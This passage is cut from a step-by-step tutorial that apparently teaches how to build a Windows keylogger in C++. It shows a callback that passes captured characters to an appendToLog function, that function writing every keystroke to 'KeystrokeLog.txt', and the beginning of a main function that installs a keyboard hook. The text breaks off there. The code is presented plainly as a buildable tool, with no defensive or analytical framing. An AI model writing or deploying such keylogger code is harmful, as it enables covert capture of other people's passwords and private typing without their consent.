                // Append to the file
                appendToLog(c);
                result = 1;
            }
        }
    }

    return result;
}
```

**Step 3: Implement the Logger Function**

Add an `appendToLog` function to write keystrokes to a file:

```cpp
void appendToLog(char c) {
    static ofstream logFile;
    static string fileName = "KeystrokeLog.txt";
    static bool fileOpen = false;

    if (!fileOpen) {
        logFile.open(fileName, fstream::app);
        fileOpen = true;
    }

    if (logFile.is_open()) {
        logFile << c;
    }
}
```

**Step 4: Set Up the Keyboard Hook**

Use `SetWindowsHook` to attach the callback:

```cpp
int main() {
    // Initialize the hook
    static HHOOK hook = 0;
